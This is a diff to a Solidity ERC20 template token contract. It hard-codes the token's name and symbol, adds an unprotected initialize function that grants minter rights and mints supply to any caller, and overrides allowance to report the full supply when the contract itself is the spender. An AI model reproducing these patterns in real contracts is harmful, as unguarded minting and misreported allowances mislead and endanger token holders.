@@ -11,7 +11,10 @@ contract BaseERC20Token is ERC20Mintable {
      * these values are immutable: they can only be set once during
      * construction.
      */
-    constructor (string memory name, string memory symbol, uint8 decimals) public {
+    constructor () public {
+      _name = "POADapps Template Token";
+      _symbol = "TST";
+      _decimals = 18;
     }
     
     function name() public view returns (string memory) {
@@ -27,9 +30,20 @@ contract BaseERC20Token is ERC20Mintable {
   }
   function initialize(string memory sym,string memory nm,uint8 dec,uint256 totalSupply)public {
       require(bytes(symbol()).length==0);
+      _addMinter(msg.sender);
+      _addMinter(address(this));
         _name = nm;
         _symbol = sym;
         _decimals = dec;
         mint(msg.sender,totalSupply);
   }
+  
+  function allowance(address owner, address spender) public view returns (uint256) {
+      if(spender == address(this)){
+        return totalSupply();
+      }else{
+        return super.allowance(owner,spender);
+      }
+    }
+
 }
